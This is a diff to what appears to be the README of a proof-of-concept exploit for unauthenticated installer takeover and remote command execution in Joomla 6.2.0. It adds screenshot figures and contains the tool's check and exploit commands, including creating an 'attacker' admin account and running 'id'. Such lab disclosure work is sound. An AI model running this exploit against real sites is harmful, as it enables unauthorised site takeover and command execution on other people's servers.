@@ -38,6 +38,9 @@ demonstrate command execution.
 ```bash
 python3 exploit/poc_unauth_rce.py https://target.example --check
 ```
+**Figure 1 — Vulnerability check against a local Joomla 6.2.0 lab.**
+
+<img width="1900" height="715" alt="joomsday-check" src="https://github.com/user-attachments/assets/8e365792-4f4e-492f-bef1-2c4924b3fbe7" />
 
 Only GET requests. Reports the fingerprintable Joomla version, whether the
 installer is present and renders the `remove` view (the vulnerable state), and
@@ -54,6 +57,17 @@ python3 exploit/poc_unauth_rce.py https://target.example --exploit \
   --admin-user attacker --admin-pass 'AttackerPass123!' \
   --cmd id --yes
 ```
+**Figure 2 — Full exploitation workflow: unauthenticated installer takeover and administrator account creation.**
+
+<img width="1907" height="836" alt="joomsday-exploit1" src="https://github.com/user-attachments/assets/2f25b0c4-682a-4793-9d55-d101a8c3b95b" />
+
+**Figure 3 — Remote command execution confirmed (`id` executed as `www-data`).**
+
+<img width="1891" height="686" alt="joomsday-exploit2" src="https://github.com/user-attachments/assets/8bc6431b-c364-44d2-8d11-69cc93e3d8da" />
+
+**Figure 4 — HTTP response verification using curl against the local Joomla lab.**
+
+<img width="1341" height="128" alt="joomsday-verify" src="https://github.com/user-attachments/assets/f496be9a-94db-4899-aaa4-361ff23b65b4" />
 
 The database must be reachable **from the target**, and the credentials must
 allow creating/populating one schema. The installer creates the schema.
